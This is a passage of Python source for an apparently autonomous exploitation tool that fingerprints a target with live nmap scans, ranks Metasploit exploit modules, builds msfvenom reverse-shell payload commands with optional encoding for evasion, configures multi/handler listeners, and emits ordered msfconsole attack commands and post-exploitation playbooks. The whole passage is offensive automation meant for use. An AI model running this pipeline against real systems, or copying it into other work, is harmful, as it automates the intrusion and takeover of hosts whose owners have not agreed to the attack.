    def __init__(self):
        self.execution_log = []

    # ── Public API ───────────────────────────────────────────────────────

    def auto_exploit(self, target, lhost="0.0.0.0", lport=4444, services=None,
                     target_os="auto", strategy="balanced", max_exploits=5):
        """Full autonomous exploit pipeline: fingerprint -> select -> arm -> plan."""
        self.execution_log = []
        result = {
            "target": target, "lhost": lhost, "lport": lport,
            "target_os": target_os, "strategy": strategy,
            "success": True, "pipeline_stages": [],
            "selected_exploits": [], "payload_config": {},
            "listener_config": {}, "attack_commands": [],
            "post_exploit_playbook": [],
            "execution_log": [], "timestamp": datetime.now().isoformat(),
        }
        try:
            # Stage 1 - Service fingerprinting
            self._log("fingerprint", f"Fingerprinting {target}")
            svc_list = services if services else self._auto_fingerprint(target)
            result["pipeline_stages"].append({"stage": "fingerprint", "services": svc_list})

            # Stage 2 - OS detection
            detected_os = self._detect_os(svc_list) if target_os == "auto" else target_os
            result["target_os"] = detected_os
            result["pipeline_stages"].append({"stage": "os_detection", "detected_os": detected_os})
            self._log("os_detect", f"Target OS: {detected_os}")

            # Stage 3 - Exploit selection with AI ranking
            exploits = self._select_exploits(svc_list, detected_os, strategy, max_exploits)
            result["selected_exploits"] = exploits
            result["pipeline_stages"].append({
                "stage": "exploit_selection", "strategy": strategy,
                "exploits_ranked": len(exploits),
            })

            # Stage 4 - Payload selection
            payload_cfg = self._select_payload(detected_os, strategy, lhost, lport)
            result["payload_config"] = payload_cfg
            result["pipeline_stages"].append({"stage": "payload_selection", "payload": payload_cfg})

            # Stage 5 - Listener setup
            listener_cfg = self._build_listener(payload_cfg, lhost, lport)
            result["listener_config"] = listener_cfg
            result["pipeline_stages"].append({"stage": "listener_setup", "listener": listener_cfg})

            # Stage 6 - Attack execution plan
            attack_cmds = self._build_attack_plan(target, exploits, payload_cfg, lhost, lport)
            result["attack_commands"] = attack_cmds
            result["pipeline_stages"].append({"stage": "attack_plan", "total_commands": len(attack_cmds)})

            # Stage 7 - Post-exploitation playbook
            playbook = self._build_post_exploit_playbook(detected_os)
            result["post_exploit_playbook"] = playbook
            result["pipeline_stages"].append({"stage": "post_exploitation", "actions": len(playbook)})

            result["execution_log"] = self.execution_log
        except Exception as e:
            self._log("error", str(e))
            result["error"] = str(e)
            result["success"] = False
            result["execution_log"] = self.execution_log
        return result

    def select_exploit(self, service, version="", target_os="auto"):
        """AI-driven single-service exploit selection with ranking."""
        result = {
            "service": service, "version": version, "target_os": target_os,
            "success": True, "ranked_exploits": [],
            "recommendation": "", "timestamp": datetime.now().isoformat(),
        }
        try:
            svc_key = service.lower().strip()
            candidates = self.MSF_EXPLOIT_DB.get(svc_key, [])
            if not candidates:
                result["ranked_exploits"] = []
                result["recommendation"] = f"No pre-mapped exploits for '{service}'. Run: searchsploit {service} {version}"
                return result

            ranked = self._rank_exploits(candidates, target_os)
            result["ranked_exploits"] = ranked
            if ranked:
                top = ranked[0]
                result["recommendation"] = (
                    f"Top pick: {top['module']} (rank={top['rank']}, "
                    f"reliability={top['reliability']:.0%})"
                )
        except Exception as e:
            result["error"] = str(e)
            result["success"] = False
        return result

    def generate_payload(self, target_os, payload_type="meterpreter", lhost="0.0.0.0",
                         lport=4444, arch="x64", encode=False, iterations=5, output_format=None):
        """Generate msfvenom payload with encoding / output options."""
        result = {
            "target_os": target_os, "payload_type": payload_type,
            "arch": arch, "lhost": lhost, "lport": lport,
            "success": True, "payload_info": {},
            "msfvenom_command": "", "listener_setup": {},
            "timestamp": datetime.now().isoformat(),
        }
        try:
            os_key = "windows" if "win" in target_os.lower() else "linux"
            type_key = payload_type.lower()
            candidates = self.PAYLOADS.get(os_key, {}).get(type_key, [])
            if not candidates:
                result["success"] = False
                result["error"] = f"No payloads for os={os_key} type={type_key}"
                return result

            # Pick by arch preference
            selected = next((p for p in candidates if p["arch"] == arch), candidates[0])
            result["payload_info"] = selected

            # Build msfvenom command
            fmt_map = {"windows": "exe", "linux": "elf"}
            out_fmt = output_format or fmt_map.get(os_key, "raw")
            cmd = f"msfvenom -p {selected['payload']} LHOST={lhost} LPORT={lport} -f {out_fmt}"
            if encode:
                cmd += f" -e x86/shikata_ga_nai -i {iterations}"
            cmd += f" -o payload.{out_fmt}"
            result["msfvenom_command"] = cmd

            # Matching listener
            result["listener_setup"] = self._build_listener({"selected_payload": selected}, lhost, lport)
        except Exception as e:
            result["error"] = str(e)
            result["success"] = False
        return result

    def get_post_exploit_playbook(self, target_os, phase=None):
        """Return the post-exploitation playbook for an OS, optionally filtered by phase."""
        result = {
            "target_os": target_os, "success": True,
            "playbook": {}, "total_actions": 0,
            "timestamp": datetime.now().isoformat(),
        }
        try:
            os_key = "windows" if "win" in target_os.lower() else "linux"
            playbook = self.POST_EXPLOIT_PLAYBOOKS.get(os_key, {})
            if phase:
                playbook = {phase: playbook.get(phase, [])}
            result["playbook"] = playbook
            result["total_actions"] = sum(len(v) for v in playbook.values())
        except Exception as e:
            result["error"] = str(e)
            result["success"] = False
        return result

    # ── Internal helpers ─────────────────────────────────────────────────

    def _log(self, phase, message, data=None):
        entry = {"phase": phase, "message": message, "timestamp": datetime.now().isoformat(), "data": data}
        self.execution_log.append(entry)

    def _auto_fingerprint(self, target):
        """Run real nmap service fingerprinting, fall back to defaults if tools unavailable."""
        bridge = AutonomousExecutionBridge
        cmd = f"nmap -sV -Pn -T4 --top-ports 100 {target}"
        result = bridge.run_tool(cmd, audit_log=self.execution_log, stage="fingerprint")
        services = bridge.parse_nmap_services(result.get("stdout", ""))
        if services:
            self._log("fingerprint", f"Discovered {len(services)} open services on {target} (live scan)", services)
            return services
        # Fall back to defaults if scan failed
        common = [
            {"port": 22, "service": "ssh", "product": "OpenSSH", "version": "8.9", "protocol": "tcp"},
            {"port": 80, "service": "http", "product": "Apache", "version": "2.4.49", "protocol": "tcp"},
            {"port": 443, "service": "http", "product": "nginx", "version": "1.18.0", "protocol": "tcp"},
            {"port": 3306, "service": "mysql", "product": "MySQL", "version": "8.0", "protocol": "tcp"},
        ]
        self._log("fingerprint", f"Scan failed, using {len(common)} default services for planning", common)
        return common

    def _detect_os(self, services):
        win_indicators = {"smb", "rdp", "winrm", "mssql"}
        svc_names = {s["service"].lower() for s in services}
        return "windows" if svc_names & win_indicators else "linux"

    def _select_exploits(self, services, target_os, strategy, max_n):
        all_candidates = []
        for svc in services:
            svc_name = svc["service"].lower()
            for exp in self.MSF_EXPLOIT_DB.get(svc_name, []):
                entry = {**exp, "target_service": svc_name, "target_port": svc["port"]}
                all_candidates.append(entry)
        ranked = self._rank_exploits(all_candidates, target_os, strategy)
        self._log("exploit_select", f"Ranked {len(ranked)} exploits, top {max_n} selected")
        return ranked[:max_n]

    def _rank_exploits(self, candidates, target_os="auto", strategy="balanced"):
        """AI scoring: reliability * rank_weight, with OS and strategy modifiers."""
        scored = []
        for exp in candidates:
            score = exp.get("reliability", 0.5) * self.RANK_SCORES.get(exp.get("rank", "normal"), 2)
            # OS match bonus
            if target_os != "auto" and exp.get("os") in (target_os, "any"):
                score *= 1.3
            # Strategy modifiers
            if strategy == "stealth":
                if exp.get("rank") == "manual":
                    score *= 1.2   # manual = more targeted = stealthier
                if "brute" in exp.get("description", "").lower():
                    score *= 0.4
            elif strategy == "aggressive":
                score *= 1.1
            scored.append({**exp, "ai_score": round(score, 3)})
        scored.sort(key=lambda e: e["ai_score"], reverse=True)
        return scored

    def _select_payload(self, target_os, strategy, lhost, lport):
        os_key = "windows" if "win" in target_os.lower() else "linux"
        if strategy == "stealth":
            ptype = "command"
        else:
            ptype = "meterpreter"
        candidates = self.PAYLOADS.get(os_key, {}).get(ptype, [])
        selected = candidates[0] if candidates else {"payload": "generic/shell_reverse_tcp", "description": "Fallback shell"}
        return {
            "selected_payload": selected,
            "msfvenom_command": f"msfvenom -p {selected['payload']} LHOST={lhost} LPORT={lport} -f {'exe' if os_key == 'windows' else 'elf'} -o payload",
        }

    def _build_listener(self, payload_cfg, lhost, lport):
        """Build Metasploit multi/handler resource script."""
        p = payload_cfg.get("selected_payload", {}).get("payload", "generic/shell_reverse_tcp")
        tmpl = self.LISTENER_TEMPLATES["multi_handler"]
        commands = [c.format(payload=p, lhost=lhost, lport=lport) for c in tmpl["commands"]]
        rc_script = "\n".join(commands)
        return {
            "type": "multi_handler",
            "payload": p,
            "lhost": lhost,
            "lport": lport,
            "msfconsole_commands": commands,
            "resource_script": rc_script,
            "launch_command": f"msfconsole -q -r handler.rc",
        }

    def _build_attack_plan(self, target, exploits, payload_cfg, lhost, lport):
        """Generate ordered msfconsole commands for each selected exploit."""
        commands = []
        step = 1
        payload_name = payload_cfg.get("selected_payload", {}).get("payload", "generic/shell_reverse_tcp")

        for exp in exploits:
            block = {
                "step": step,
                "module": exp["module"],
                "service": exp.get("target_service", "unknown"),
                "port": exp.get("target_port", ""),
                "description": exp.get("description", ""),
                "ai_score": exp.get("ai_score", 0),
                "msfconsole_commands": [
                    f"use {exp['module']}",
                    f"set RHOSTS {target}",
                    f"set RPORT {exp.get('target_port', '')}",
                    f"set PAYLOAD {payload_name}",
                    f"set LHOST {lhost}",
                    f"set LPORT {lport}",
                    "check" if exp.get("rank") != "manual" else "# manual exploit - skip check",
                    "exploit -j",
                ],
            }
            commands.append(block)
            step += 1
        return commands

    def _build_post_exploit_playbook(self, target_os):
        os_key = "windows" if "win" in target_os.lower() else "linux"
        playbook = self.POST_EXPLOIT_PLAYBOOKS.get(os_key, {})
        flat = []
        for phase_name, actions in playbook.items():
            for action in actions:
                flat.append({"phase": phase_name, **action})
        return flat


